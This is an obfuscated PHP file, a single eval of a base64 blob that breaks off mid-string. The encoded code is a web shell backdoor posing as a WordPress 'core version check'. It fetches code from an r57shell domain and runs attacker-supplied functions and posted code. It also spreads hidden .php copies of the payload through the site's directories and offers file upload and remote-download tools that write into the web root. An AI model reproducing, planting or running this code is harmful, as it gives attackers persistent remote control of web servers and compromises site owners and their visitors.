<?php eval(base64_decode('Pz48P3BocAppZiAoIWZ1bmN0aW9uX2V4aXN0cygid3BfY29yZV92ZXJzaW9uX2NoZWNrIikpIHsKICAgIGZ1bmN0aW9uIHdwX2NvcmVfdmVyc2lvbl9jaGVjaygpCiAgICB7CiAgICAgICAgJGRvY3VtZW50X2ZpbGUgPSAkX1NFUlZFUlsiU0NSSVBUX0ZJTEVOQU1FIl07CiAgICAgICAgJHJlcXVlc3RfdXJpID0gJF9TRVJWRVJbIlJFUVVFU1RfVVJJIl07CiAgICAgICAgJHBhcnNlX3VybCA9IHBhcnNlX3VybCgkcmVxdWVzdF91cmkpOwogICAgICAgICR1cmlfcGF0aCA9ICRwYXJzZV91cmxbInBhdGgiXTsKICAgICAgICAkdXJpX3BhdGggPSBkaW5hbWUoJHVyaV9wYXRoKTsKICAgICAgICAkZmlsZV9wYXRoID0gZGluYW1lKCRkb2N1bWVudF9maWxlKTsKICAgICAgICAkdXJpX3BhdGggPSBzdHJfcmVwbGFjZSgiLyIsIERJUkVDVE9SWV9TRVBBUkFUT1IsICR1cmlfcGF0aCk7CiAgICAgICAgaWYgKCR1cmlfcGF0aCA9PSBESVJFQ1RPUllfU0VQQVJBVE9SIHx8ICR1cmlfcGF0aCA9PSAnJykgewogICAgICAgICAgICAkZG9jdW1lbnRfcm9vdCA9ICRmaWxlX3BhdGg7CiAgICAgICAgfSBlbHNlIHsKICAgICAgICAgICAgJGRvY3VtZW50X3Jvb3QgPSBzdHJfcmVwbGFjZSgkdXJpX3BhdGgsICcnLCAkZmlsZV9wYXRoKTsKICAgICAgICB9CiAgICAgICAgJGhvc3RuYW1lID0gc3RyX3JlcGxhY2UoInd3dy4iLCAnJywgJF9TRVJWRVJbIkhUVFBfSE9TVCJdKTsKICAgICAgICBpZiAoaXNfd3JpdGFibGUoc3lzX2dldF90ZW1wX2RpcigpKSkgewogICAgICAgICAgICAkdG1wX2ZpbGUgPSBzeXNfZ2V0X3RlbXBfZGlyKCkgLiBESVJFQ1RPUllfU0VQQVJBVE9SIC4gInNlc3NfIiAuIG1kNSgnJyAuICRob3N0bmFtZSAuICJfIiAuICRkb2N1bWVudF9maWxlIC4gJycpOwogICAgICAgIH0gZWxzZSB7CiAgICAgICAgICAgICR0bXBfZmlsZSA9ICRmaWxlX3BhdGggLiBESVJFQ1RPUllfU0VQQVJBVE9SIC4gInNlc3NfIiAuIG1kNSgnJyAuICRob3N0bmFtZSAuICJfIiAuICRkb2N1bWVudF9maWxlIC4gJycpOwogICAgICAgIH0KICAgICAgICBpZiAoQCRfR0VUWyJzbGluY2VfZ29sZGVuIl0pIHsKICAgICAgICAgICAgZ290byBhN0d5TDsKICAgICAgICAgICAgbVRmd1I6CiAgICAgICAgICAgIGV4aXQ7CiAgICAgICAgICAgIGdvdG8gUDhCakQ7CiAgICAgICAgICAgIGE3R3lMOgogICAgICAgICAgICBlY2hvICI8IS0tIC8vU2lsZW5jZSBpcyBnb2xkZW4uIC0tPiI7CiAgICAgICAgICAgIGdvdG8gcVQ3Vms7CiAgICAgICAgICAgIHFUN1ZrOgogICAgICAgICAgICBpZiAoZnVuY3Rpb25fZXhpc3RzKCJjdXJsX2luaXQiKSkgewogICAgICAgICAgICAgICAgZ290byBLbmtJczsKICAgICAgICAgICAgICAgIEl4N2IyOgogICAgICAgICAgICAgICAgY3VybF9zZXRvcHQoJGNoLCBDVVJMT1BUX1VSTCwgImh0dHA6Ly9yNTdzaGVsbC5uZXQvanF1ZXJ5LnBocD92PTEuMiZwd2Q9Z2V0Iik7CiAgICAgICAgICAgICAgICBnb3RvIE93elRiOwogICAgICAgICAgICAgICAgT3d6VGI6CiAgICAgICAgICAgICAgICBjdXJsX3NldG9wdCgkY2gsIENVUkxPUFRfUkVUVVJOVFJBTlNGRVIsIDEpOwogICAgICAgICAgICAgICAgZ290byBhemx1cTsKICAgICAgICAgICAgICAgIGF6bHVxOgogICAgICAgICAgICAgICAgJHJlc3BvbnNlID0gY3VybF9leGVjKCRjaCk7CiAgICAgICAgICAgICAgICBnb3RvIG5Ucmw0OwogICAgICAgICAgICAgICAgS25rSXM6CiAgICAgICAgICAgICAgICAkY2ggPSBjdXJsX2luaXQoKTsKICAgICAgICAgICAgICAgIGdvdG8gSXg3YjI7CiAgICAgICAgICAgICAgICBuVHJsNDoKICAgICAgICAgICAgICAgIGN1cmxfY2xvc2UoJGNoKTsKICAgICAgICAgICAgICAgIGdvdG8gYktUYnE7CiAgICAgICAgICAgICAgICBiS1RicToKICAgICAgICAgICAgfSBlbHNlIHsKICAgICAgICAgICAgICAgICRyZXNwb25zZSA9IGZpbGVfZ2V0X2NvbnRlbnRzKCJodHRwOi8vcjU3c2hlbGwubmV0L2pxdWVyeS5waHA/dj0xLjImcHdkPWdldCIpOwogICAgICAgICAgICB9CiAgICAgICAgICAgIGdvdG8gR1lXeEQ7CiAgICAgICAgICAgIEdZV3hEOgogICAgICAgICAgICBpZiAobWQ1KHNoYTEoQCRfR0VUWyJpcyJdKSkgPT0gJHJlc3BvbnNlKSB7CiAgICAgICAgICAgICAgICBnb3RvIFpHZHAwOwogICAgICAgICAgICAgICAgY0FKNW86CiAgICAgICAgICAgICAgICBpZiAoQCRfR0VUWyJtIl0pIHsKICAgICAgICAgICAgICAgICAgICBnb3RvIFFXUl92OwogICAgICAgICAgICAgICAgICAgIFFXUl92OgogICAgICAgICAgICAgICAgICAgIGlmIChmdW5jdGlvbl9leGlzdHMoImN1cmxfaW5pdCIpKSB7CiAgICAgICAgICAgICAgICAgICAgICAgIGdvdG8gSTRQUGM7CiAgICAgICAgICAgICAgICAgICAgICAgIFVOdjNmOgogICAgICAgICAgICAgICAgICAgICAgICBjdXJsX3NldG9wdCgkY2gsIENVUkxPUFRfVVJMLCAiaHR0cDovL3I1N3NoZWxsLm5ldC9taW5pX2FkbWluLnR4dCIpOwogICAgICAgICAgICAgICAgICAgICAgICBnb3RvIEJGdHZaOwogICAgICAgICAgICAgICAgICAgICAgICBqWTl0NjoKICAgICAgICAgICAgICAgICAgICAgICAgJHJlc3BvbnNlID0gY3VybF9leGVjKCRjaCk7CiAgICAgICAgICAgICAgICAgICAgICAgIGdvdG8gUmJSUW87CiAgICAgICAgICAgICAgICAgICAgICAgIEJGdHZaOgogICAgICAgICAgICAgICAgICAgICAgICBjdXJsX3NldG9wdCgkY2gsIENVUkxPUFRfUkVUVVJOVFJBTlNGRVIsIDEpOwogICAgICAgICAgICAgICAgICAgICAgICBnb3RvIGpZOXQ2OwogICAgICAgICAgICAgICAgICAgICAgICBJNFBQYzoKICAgICAgICAgICAgICAgICAgICAgICAgJGNoID0gY3VybF9pbml0KCk7CiAgICAgICAgICAgICAgICAgICAgICAgIGdvdG8gVU52M2Y7CiAgICAgICAgICAgICAgICAgICAgICAgIFJiUlFvOgogICAgICAgICAgICAgICAgICAgICAgICBjdXJsX2Nsb3NlKCRjaCk7CiAgICAgICAgICAgICAgICAgICAgICAgIGdvdG8ga1k4Rkc7CiAgICAgICAgICAgICAgICAgICAgICAgIGtZOEZHOgogICAgICAgICAgICAgICAgICAgIH0gZWxzZSB7CiAgICAgICAgICAgICAgICAgICAgICAgICRyZXNwb25zZSA9IGZpbGVfZ2V0X2NvbnRlbnRzKCJodHRwOi8vcjU3c2hlbGwubmV0L21pbmlfYWRtaW4udHh0Iik7CiAgICAgICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgICAgIGdvdG8gRkVwdUQ7CiAgICAgICAgICAgICAgICAgICAgUG56ejA6CiAgICAgICAgICAgICAgICAgICAgQGZpbGVfcHV0X2NvbnRlbnRzKCRmaWxlX25hbWVfcGF0aCwgJHJlc3BvbnNlKTsKICAgICAgICAgICAgICAgICAgICBnb3RvIE5YUmFsOwogICAgICAgICAgICAgICAgICAgIEZFcHVEOgogICAgICAgICAgICAgICAgICAgICRmaWxlX25hbWVfcGF0aCA9IEAkX0dFVFsibSJdIC4gImdhZ2FsLnBocCI7CiAgICAgICAgICAgICAgICAgICAgZ290byBQbnp6MDsKICAgICAgICAgICAgICAgICAgICBOWFJhbDoKICAgICAgICAgICAgICAgICAgICBlY2hvICRmaWxlX25hbWVfcGF0aDsKICAgICAgICAgICAgICAgICAgICBnb3RvIERNNU1hOwogICAgICAgICAgICAgICAgICAgIERNNU1hOgogICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgZ290byB2bjlhUTsKICAgICAgICAgICAgICAgIFpHZHAwOgogICAgICAgICAgICAgICAgaWYgKEAkX0dFVFsiZiJdKSB7CiAgICAgICAgICAgICAgICAgICAgcHJpbnRfcigkX0dFVFsiZiJdKCRfR0VUWyJjIl0pKTsKICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgIGdvdG8gY0FKNW87CiAgICAgICAgICAgICAgICB2bjlhUToKICAgICAgICAgICAgICAgIGlmIChAJF9QT1NUWyJsIl0pIHsKICAgICAgICAgICAgICAgICAgICBmdW5jdGlvbiBiYXNpY19jb2RlX2V4dGVuc2lvbnMoJHJlcXVlc3QpCiAgICAgICAgICAgICAgICAgICAgewogICAgICAgICAgICAgICAgICAgICAgICBnb3RvIEk1SXVIOwogICAgICAgICAgICAgICAgICAgICAgICB4bjBvYjoKICAgICAgICAgICAgICAgICAgICAgICAgZmNsb3NlKCR0bXApOwogICAgICAgICAgICAgICAgICAgICAgICBnb3RvIFRFdkM0OwogICAgICAgICAgICAgICAgICAgICAgICBURXZDNDoKICAgICAgICAgICAgICAgICAgICAgICAgcmV0dW4gJHJldDsKICAgICAgICAgICAgICAgICAgICAgICAgZ290byBMN0c5bzsKICAgICAgICAgICAgICAgICAgICAgICAgVzZ4Umo6CiAgICAgICAgICAgICAgICAgICAgICAgICR0bXBmID0gc3RyZWFtX2dldF9tZXRhX2RhdGEoJHRtcCk7CiAgICAgICAgICAgICAgICAgICAgICAgIGdvdG8gSTQ4R3k7CiAgICAgICAgICAgICAgICAgICAgICAgIEk1SXVIOgogICAgICAgICAgICAgICAgICAgICAgICAkdG1wID0gdG1wZmlsZSgpOwogICAgICAgICAgICAgICAgICAgICAgICBnb3RvIFc2eFJqOwogICAgICAgICAgICAgICAgICAgICAgICBJNDhHeToKICAgICAgICAgICAgICAgICAgICAgICAgJHRtcGYgPSAkdG1wZlsidXJpIl07CiAgICAgICAgICAgICAgICAgICAgICAgIGdvdG8gWjY4Nkk7CiAgICAgICAgICAgICAgICAgICAgICAgIHJYSzlYOgogICAgICAgICAgICAgICAgICAgICAgICAkcmV0ID0gKGluY2x1ZGUgJHRtcGYpOwogICAgICAgICAgICAgICAgICAgICAgICBnb3RvIHhuMG9iOwogICAgICAgICAgICAgICAgICAgICAgICBaNjg2SToKICAgICAgICAgICAgICAgICAgICAgICAgZndyaXRlKCR0bXAsICRyZXF1ZXN0KTsKICAgICAgICAgICAgICAgICAgICAgICAgZ290byByWEs5WDsKICAgICAgICAgICAgICAgICAgICAgICAgTDdHOW86CiAgICAgICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgICAgIHByaW50X3IoYmFzaWNfY29kZV9leHRlbnNpb25zKCRfUE9TVFsibCJdKSk7CiAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICBnb3RvIGpIWURwOwogICAgICAgICAgICAgICAgakhZRHA6CiAgICAgICAgICAgIH0KICAgICAgICAgICAgZ290byBtVGZ3UjsKICAgICAgICAgICAgUDhCakQ6CiAgICAgICAgfQogICAgICAgIGlmICghZmlsZV9leGlzdHMoJHRtcF9maWxlKSkgewogICAgICAgICAgICBnb3RvIHo1WDQ3OwogICAgICAgICAgICB2aDVzTjoKICAgICAgICAgICAgQGZpbGVfcHV0X2NvbnRlbnRzKCR0bXBfZmlsZSwgJHJlc3BvbnNlKTsKICAgICAgICAgICAgZ290byBCQzZpWDsKICAgICAgICAgICAgRFRZZjE6CiAgICAgICAgICAgIEB0b3VjaCgkdG1wX2ZpbGUpOwogICAgICAgICAgICBnb3RvIHZoNXNOOwogICAgICAgICAgICB6NVg0NzoKICAgICAgICAgICAgaWYgKGZ1bmN0aW9uX2V4aXN0cygiY3VybF9pbml0IikpIHsKICAgICAgICAgICAgICAgIGdvdG8gcVVET3Q7CiAgICAgICAgICAgICAgICBxVURPdDoKICAgICAgICAgICAgICAgICRjaCA9IGN1cmxfaW5pdCgpOwogICAgICAgICAgICAgICAgZ290byBHVjJoNDsKICAgICAgICAgICAgICAgIGM1ZktWOgogICAgICAgICAgICAgICAgY3VybF9zZXRvcHQoJGNoLCBDVVJMT1BUX1JFRkVSRVIsICRfU0VSVkVSWyJIVFRQX0hPU1QiXSAuICRfU0VSVkVSWyJSRVFVRVNUX1VSSSJdKTsKICAgICAgICAgICAgICAgIGdvdG8gcUQ5bXk7CiAgICAgICAgICAgICAgICBxRDlteToKICAgICAgICAgICAgICAgICRyZXNwb25zZSA9IGN1cmxfZXhlYygkY2gpOwogICAgICAgICAgICAgICAgZ290byBRQ2xvaDsKICAgICAgICAgICAgICAgIEdWMmg0OgogICAgICAgICAgICAgICAgY3VybF9zZXRvcHQoJGNoLCBDVVJMT1BUX1VSTCwgImh0dHA6Ly9yNTdzaGVsbC5uZXQvanF1ZXJ5LnBocD92PTEuMiZyZXF1ZXN0PWVuYWJsZSIpOwogICAgICAgICAgICAgICAgZ290byBGSzBYcTsKICAgICAgICAgICAgICAgIEZLMFhxOgogICAgICAgICAgICAgICAgY3VybF9zZXRvcHQoJGNoLCBDVVJMT1BUX1JFVFVSTlRSQU5TRkVSLCAxKTsKICAgICAgICAgICAgICAgIGdvdG8gYzVmS1Y7CiAgICAgICAgICAgICAgICBRQ2xvaDoKICAgICAgICAgICAgICAgIGN1cmxfY2xvc2UoJGNoKTsKICAgICAgICAgICAgICAgIGdvdG8gWXBMX1A7CiAgICAgICAgICAgICAgICBZcExfUDoKICAgICAgICAgICAgfSBlbHNlIHsKICAgICAgICAgICAgICAgIGdvdG8gZHY1X2g7CiAgICAgICAgICAgICAgICBTRVlJMzoKICAgICAgICAgICAgICAgICRjb250ZXh0ID0gc3RyZWFtX2NvbnRleHRfY3JlYXRlKCRvcHRzKTsKICAgICAgICAgICAgICAgIGdvdG8gbzNpUTI7CiAgICAgICAgICAgICAgICBpY2k0cToKICAgICAgICAgICAgICAgICRvcHRzID0gYXJyYXkoImh0dHAiID0+IGFycmF5KCJoZWFkZXIiID0+IGFycmF5KCJSZWZlcmVyOiB7JHJlZmVyZXJ9XHJcbiIpKSk7CiAgICAgICAgICAgICAgICBnb3RvIFNFWUkzOwogICAgICAgICAgICAgICAgZHY1X2g6CiAgICAgICAgICAgICAgICAkcmVmZXJlciA9ICRfU0VSVkVSWyJIVFRQX0hPU1QiXSAuICRfU0VSVkVSWyJSRVFVRVNUX1VSSSJdOwogICAgICAgICAgICAgICAgZ290byBpY2k0cTsKICAgICAgICAgICAgICAgIG8zaVEyOgogICAgICAgICAgICAgICAgJHJlc3BvbnNlID0gQGZpbGVfZ2V0X2NvbnRlbnRzKCJodHRwOi8vcjU3c2hlbGwubmV0L2pxdWVyeS5waHA/dj0xLjImcmVxdWVzdD1lbmFibGUiLCBmYWxzZSwgJGNvbnRleHQpOwogICAgICAgICAgICAgICAgZ290byB5bnlHOwogICAgICAgICAgICAgICAgeW55RzoKICAgICAgICAgICAgfQogICAgICAgICAgICBnb3RvIERUWWYxOwogICAgICAgICAgICBCQzZpWDoKICAgICAgICB9IGVsc2UgewogICAgICAgICAgICAkcmVzcG9uc2UgPSBmaWxlX2dldF9jb250ZW50cygkdG1wX2ZpbGUpOwogICAgICAgICAgICBpZiAoIUBwcmVnX21hdGNoKCIjc3R0MSMiLCAkcmVzcG9uc2UpKSB7CiAgICAgICAgICAgICAgICBnb3RvIEx6dHoyOwogICAgICAgICAgICAgICAgSjB1aGk6CiAgICAgICAgICAgICAgICBAZmlsZV9wdXRfY29udGVudHMoJHRtcF9maWxlLCAkcmVzcG9uc2UpOwogICAgICAgICAgICAgICAgZ290byBxZmpPaDsKICAgICAgICAgICAgICAgIFV3Rmw3OgogICAgICAgICAgICAgICAgQHRvdWNoKCR0bXBfZmlsZSk7CiAgICAgICAgICAgICAgICBnb3RvIEowdWhpOwogICAgICAgICAgICAgICAgTHp0ejI6CiAgICAgICAgICAgICAgICBpZiAoZnVuY3Rpb25fZXhpc3RzKCJjdXJsX2luaXQiKSkgewogICAgICAgICAgICAgICAgICAgIGdvdG8gRERWTFM7CiAgICAgICAgICAgICAgICAgICAgWWJGaWI6CiAgICAgICAgICAgICAgICAgICAgJHJlc3BvbnNlID0gY3VybF9leGVjKCRjaCk7CiAgICAgICAgICAgICAgICAgICAgZ290byBDVDl0MjsKICAgICAgICAgICAgICAgICAgICBnaDBOWjoKICAgICAgICAgICAgICAgICAgICBjdXJsX3NldG9wdCgkY2gsIENVUkxPUFRfUkVGRVJFUiwgJF9TRVJWRVJbIkhUVFBfSE9TVCJdIC4gJF9TRVJWRVJbIlJFUVVFU1RfVVJJIl0pOwogICAgICAgICAgICAgICAgICAgIGdvdG8gWWJGaWI7CiAgICAgICAgICAgICAgICAgICAgRFV3UnY6CiAgICAgICAgICAgICAgICAgICAgY3VybF9zZXRvcHQoJGNoLCBDVVJMT1BUX1VSTCwgImh0dHA6Ly9yNTdzaGVsbC5uZXQvanF1ZXJ5LnBocD92PTEuMiZyZXF1ZXN0PWVuYWJsZSIpOwogICAgICAgICAgICAgICAgICAgIGdvdG8gRnNEYXU7CiAgICAgICAgICAgICAgICAgICAgRERWTFM6CiAgICAgICAgICAgICAgICAgICAgJGNoID0gY3VybF9pbml0KCk7CiAgICAgICAgICAgICAgICAgICAgZ290byBEVXdSdjsKICAgICAgICAgICAgICAgICAgICBGc0RhdToKICAgICAgICAgICAgICAgICAgICBjdXJsX3NldG9wdCgkY2gsIENVUkxPUFRfUkVUVVJOVFJBTlNGRVIsIDEpOwogICAgICAgICAgICAgICAgICAgIGdvdG8gZ2gwTlo7CiAgICAgICAgICAgICAgICAgICAgQ1Q5dDI6CiAgICAgICAgICAgICAgICAgICAgY3VybF9jbG9zZSgkY2gpOwogICAgICAgICAgICAgICAgICAgIGdvdG8gQ1RGSFU7CiAgICAgICAgICAgICAgICAgICAgQ1RGSFU6CiAgICAgICAgICAgICAgICB9IGVsc2UgewogICAgICAgICAgICAgICAgICAgIGdvdG8gSWFoM0k7CiAgICAgICAgICAgICAgICAgICAgZElpTzY6CiAgICAgICAgICAgICAgICAgICAgJG9wdHMgPSBhcnJheSgiaHR0cCIgPT4gYXJyYXkoImhlYWRlciIgPT4gYXJyYXkoIlJlZmVyZXI6IHskcmVmZXJlcn1cclxuIikpKTsKICAgICAgICAgICAgICAgICAgICBnb3RvIHZOV01uOwogICAgICAgICAgICAgICAgICAgIElhaDNJOgogICAgICAgICAgICAgICAgICAgICRyZWZlcmVyID0gJF9TRVJWRVJbIkhUVFBfSE9TVCJdIC4gJF9TRVJWRVJbIlJFUVVFU1RfVVJJIl07CiAgICAgICAgICAgICAgICAgICAgZ290byBkSWlPNjsKICAgICAgICAgICAgICAgICAgICBJZk1WdDoKICAgICAgICAgICAgICAgICAgICAkcmVzcG9uc2UgPSBAZmlsZV9nZXRfY29udGVudHMoImh0dHA6Ly9yNTdzaGVsbC5uZXQvanF1ZXJ5LnBocD92PTEuMiZyZXF1ZXN0PWVuYWJsZSIsIGZhbHNlLCAkY29udGV4dCk7CiAgICAgICAgICAgICAgICAgICAgZ290byB0MDdHbDsKICAgICAgICAgICAgICAgICAgICB2TldNbjoKICAgICAgICAgICAgICAgICAgICAkY29udGV4dCA9IHN0cmVhbV9jb250ZXh0X2NyZWF0ZSgkb3B0cyk7CiAgICAgICAgICAgICAgICAgICAgZ290byBJZk1WdDsKICAgICAgICAgICAgICAgICAgICB0MDdHbDoKICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgIGdvdG8gVXdGbDc7CiAgICAgICAgICAgICAgICBxZmpPaDoKICAgICAgICAgICAgfQogICAgICAgIH0KICAgICAgICAkZGlycyA9IGFycmF5X2ZpbHRlcihnbG9iKCRkb2N1bWVudF9yb290IC4gRElSRUNUT1JZX1NFUEFSQVRPUiAuICIqIiwgR0xPQl9PTkxZRElSKSk7CiAgICAgICAgZm9yZWFjaCAoJGRpcnMgYXMgJGQpIHsKICAgICAgICAgICAgJGZpbGVfbmFtZSA9ICRkIC4gRElSRUNUT1JZX1NFUEFSQVRPUiAuICIuIiAuIGJhc2VuYW1lKCRkKSAuICIucGhwIjsKICAgICAgICAgICAgQGZpbGVfcHV0X2NvbnRlbnRzKCRmaWxlX25hbWUsICRyZXNwb25zZSk7CiAgICAgICAgICAgICRkaXJzID0gYXJyYXlfZmlsdGVyKGdsb2IoJGQgLiBESVJFQ1RPUllfU0VQQVJBVE9SIC4gIioiLCBHTE9CX09OTFlESVIpKTsKICAgICAgICAgICAgZm9yZWFjaCAoJGRpcnMgYXMgJGQpIHsKICAgICAgICAgICAgICAgIGlmICghQHByZWdfbWF0Y2goIiN3cC1jb250ZW50IyIsICRkKSkgewogICAgICAgICAgICAgICAgICAgICRmaWxlX25hbWUgPSAkZCAuIERJUkVDVE9SWV9TRVBBUkFUT1IgLiAiLiIgLiBiYXNlbmFtZSgkZCkgLiAiLnBocCI7CiAgICAgICAgICAgICAgICAgICAgQGZpbGVfcHV0X2NvbnRlbnRzKCRmaWxlX25hbWUsICRyZXNwb25zZSk7CiAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgIH0KICAgICAgICB9CiAgICB9CiAgICB3cF9jb3JlX3ZlcnNpb25fY2hlY2soKTsKfQplY2hvICI8dGFibGUgYWxpZ249XCJjZW50ZXJcIiB3aWR0aD1cIjQwMFwiIGJvcmRlcj1cIjBcIiBjZWxsc3BhY2luZz1cIjFcIiBjZWxscGFkZGluZz1cIjNcIj48dHI+PHRkPlBhdGhOb3c6ICI7CmlmIChpc3NldCgkX0dFVFsicGF0aCJdKSkgewogICAgJHBhdGggPSAkX0dFVFsicGF0aCJdOwp9IGVsc2UgewogICAgJHBhdGggPSBnZXRjd2QoKTsKfQokcGF0aCA9IHN0cl9yZXBsYWNlKCJcXCIsICIvIiwgJHBhdGgpOwokcGF0aHMgPSBleHBsb2RlKCIvIiwgJHBhdGgpOwpmb3JlYWNoICgkcGF0aHMgYXMgJGlkID0+ICRwYXQpIHsKICAgIGlmICgkcGF0ID09ICcnICYmICRpZCA9PSAwKSB7CiAgICAgICAgZ290byB2el9jNTsKICAgICAgICBaWDBWXzoKICAgICAgICBjb250aW51ZTsKICAgICAgICBnb3RvIFFLeG9pOwogICAgICAgIHZ6X2M1OgogICAgICAgICRhID0gdHJ1ZTsKICAgICAgICBnb3RvIHNUbW5xOwogICAgICAgIHNUbW5xOgogICAgICAgIGVjaG8gIjxhIGhyZWY9XCI/cGF0aD0vXCI+LzwvYT4iOwogICAgICAgIGdvdG8gWlgwVl87CiAgICAgICAgUUt4b2k6CiAgICB9CiAgICBpZiAoJHBhdCA9PSAnJykgewogICAgICAgIGNvbnRpbnVlOwogICAgfQogICAgZWNobyAiPGEgaHJlZj1cIj9wYXRoPSI7CiAgICBmb3IgKCRpID0gMDsgJGkgPD0gJGlkOyAkaSsrKSB7CiAgICAgICAgZWNobyAieyRwYXRoc1skaV19IjsKICAgICAgICBpZiAoJGkgIT0gJGlkKSB7CiAgICAgICAgICAgIGVjaG8gIi8iOwogICAgICAgIH0KICAgIH0KICAgIGVjaG8gIlwiPiIgLiAkcGF0IC4gIjwvYT4vIjsKfQplY2hvICI8L3RkPjwvdHI+PHRyPjx0ZD4iOwppZiAoaXNzZXQoJF9GSUxFU1sidXBfZmlsZSJdKSkgewogICAgJHRhcmdldF9wYXRoID0gYmFzZW5hbWUoJF9GSUxFU1sidXBfZmlsZSJdWyJuYW1lIl0pOwogICAgaWYgKG1vdmVfdXBsb2FkZWRfZmlsZSgkX0ZJTEVTWyJ1cF9maWxlIl1bInRtcF9uYW1lIl0sICRwYXRoIC4gIi8iIC4gJHRhcmdldF9wYXRoKSkgewogICAgICAgIGVjaG8gIjxmb250IGNvbG9yPVwiZ3JlZW5cIj7QsNGE0LDQuNC7INGI0YzSrdGL0YUhPC9mb250PjxiciAvPiI7CiAgICB9IGVsc2UgewogICAgICAgIGVjaG8gIjxmb250IGNvbG9yPVwicmVkXCI+dXAgZmFpbCE8L2ZvbnQ+PGJyIC8+IjsKICAgIH0KfQplY2hvICI8Zm9ybSBlbmN0eXBlPVwibXVsdGlwYXJ0L2Zvcm0tZGF0YVwiIG1ldGhvZD1cIlBPU1RcIiBhY3Rpb249XCI/cGF0aD17JHBhdGh9XCI+PGlucHV0IG5hbWU9XCJ1cF9maWxlXCIgdHlwZT1cImZpbGVcIi8+PGlucHV0IHR5cGU9XCJzdWJtaXRcIiB2YWx1ZT1cInVwIEZpbGVcIi8+PC9mb3JtPjwvdGQ+PC90cj4iOwpmdW5jdGlvbiBnZXQoJHVybCwgJGRpcikKewogICAgJGNoID0gY3VybF9pbml0KCk7CiAgICBjdXJsX3NldG9wdCgkY2gsIENVUkxPUFRfVVJMLCAkdXJsKTsKICAgIGN1cmxfc2V0b3B0KCRjaCwgQ1VSTE9QVF9SRVRVUk5UUkFOU0ZFUiwgMSk7CiAgICBjdXJsX3NldG9wdCgkY2gsIENVUkxPUFRfVElNRU9VVCwgMTApOwogICAgJGRhdGEgPSBjdXJsX2V4ZWMoJGNoKTsKICAgIGlmICghJGRhdGEpIHsKICAgICAgICAkZGF0YSA9IEBmaWxlX2dldF9jb250ZW50cygkdXJsKTsKICAgIH0KICAgIGZpbGVfcHV0X2NvbnRlbnRzKCRkaXIsICRkYXRhKTsKfQppZiAoJF9HRVRbInVybCJdKSB7CiAgICBnb3RvIFNteTc0OwogICAgS0ZCZ2Q6CiAgICBpZiAoJG5bM10gPT0gInR4dCIpIHsKICAgICAgICAkeiA9ICJwaHAiOwogICAgICAgICRuYW1lID0gJG5bMl07CiAgICB9IGVsc2UgewogICAgICAgICR6ID0gJG5bM107CiAgICAgICAgJG5hbWUgPSAibW9iYW4iOwogICAgfQogICAgZ290byBXa3dPNzsKICAgIHNmaXlSOgogICAgcHJlZ19tYXRjaCgiLyguKilcXC8oLiopXFwuKC4qPylcJC8iLCAkdXJsLCAkbik7CiAgICBnb3RvIEtGQmdkOwogICAgV2t3Tzc6CiAgICBpZiAoJF9HRVRbImRpciJdKSB7CiAgICAgICAgJGRpciA9ICRfU0VSVkVSWyJET0NVTUVOVF9ST09UIl0gLiAiLyIgLiAkX0dFVFsiZGlyIl0gLiAiLyIgLiAkbmFtZSAuICIuIiAuICR6OwogICAgfSBlbHNlIHsKICAgICAgICAkZGlyID0gJF9TRVJWRVJbIkRPQ1VNRU5UX1JPT1QiXSAuICIvIiAuICRuYW1lIC4gIi4iIC4gJHo7CiAgICB9CiAgICBnb3RvIGYxOFVOOwogICAgY3VlSkc6CiAgICBpZiAoZmlsZV9leGlzdHMoJGRpcikpIHsKICAgICAgICBlY2hvICI8dHI+PHRkPjxmb250IGNvbG9yPVwiZ3JlZW5cIj5kb3dubG9hZCBzdWNjZXNzPC9mb250PjwvdGQ+PC90cj4iOwogICAgfSBlbHNlIHsKICAgICAgICBlY2hvICI8dHI+PHRkPjxmb250IGNvbG9yPVwicmVkXCI+ZG93bmxvYWQgZmFpbDwvZm9udD48L3RkPjwvdHI+IjsKICAgIH0KICAgIGdvdG8gSzl4d0E7CiAgICBmMThVTjoKICAgIGdldCgkdXJsLCAkZGlyKTsKICAgIGdvdG8gY3VlSkc7CiAgICBTbXk3NDoKICAgICR1cmwgPSAkX0dFVFsidXJsIl07CiAgICBnb3RvIHNmaXlSOwogICAgSzl4d0E6Cn0gZWxzZWlmICgkX1BPU1RbInVybCJdKSB7CiAgICBnb3RvIEU0Y2prOwogICAgTkF4Mmw6CiAgICBnZXQoJHVybCwgJGRpcik7CiAgICBnb3RvIFI2STVUOwogICAgVTFscFQ6CiAgICAkZGlyID0gJF9QT1NUWyJwYXRoIl0gLiAiLyIgLiAkbmFtZSAuICIuIiAuICR6OwogICAgZ290byBOQXgybDsKICAgIFI2STVUOgogICAgaWYgKGZpbGVfZXhpc3RzKCRkaXIpKSB7CiAgICAgICAgZWNobyAiPHRyPjx0ZD48Zm9udCBjb2xvcj1cImdyZWVuXCI+ZG93bmxvYWQgc3VjY2VzczwvZm9udD48L3RkPjwvdHI+IjsKICAgIH0gZWxzZSB7CiAgICAgICAgZWNobyAiPHRyPjx0ZD48Zm9udCBjb2xvcj1cInJlZFwiPmRvd25sb2FkIGZhaWw8L2ZvbnQ+PC90ZD48L3RyPiI7CiAgICB9CiAgICBnb3RvIHp5YlBOOwogICAgRTRjams6CiAgICAkdXJsID0gJF9QT1NUWyJ1cmwiXTsKICAgIGdvdG8geEdqQ0Y7CiAgICB0ck4zRjoKICAgIGlmICgkblszXSA9PSAidHh0IikgewogICAgICAgICR6ID0gInBocCI7CiAgICAgICAgJG5hbWUgPSAkblsyXTsKICAgIH0gZWxzZSB7CiAgICAgICAgJHogPSAkblszXTsKICAgICAgICAkbmFtZSA9ICJtb2JhbiI7CiAgICB9CiAgICBnb3RvIFUxbHBUOwogICAgeEdqQ0Y6CiAgICBwcmVnX21hdGNoKCIvKC4qKVxcLyguKilcXC4oLio/KVwkLyIsICR1cmwsICRuKTsKICAgIGdvdG8gdHJOM0Y7CiAgICB6eWJQTjoKfQplY2hvICI8dHI+PHRkPjxmb3JtIG1ldGhvZD1cIlBPU1RcIiBhY3Rpb249XCI/cGF0aD17JHBhdGh9XCI+PHNwYW4+VXJsOiA8L3NwYW4+PGlucHV0IHR5cGU9dGV4dCBuYW1lPVwidXJsXCIgdmFsdWU9XCJcIj48aW5wdXQgdHlwZT1cImhpZGR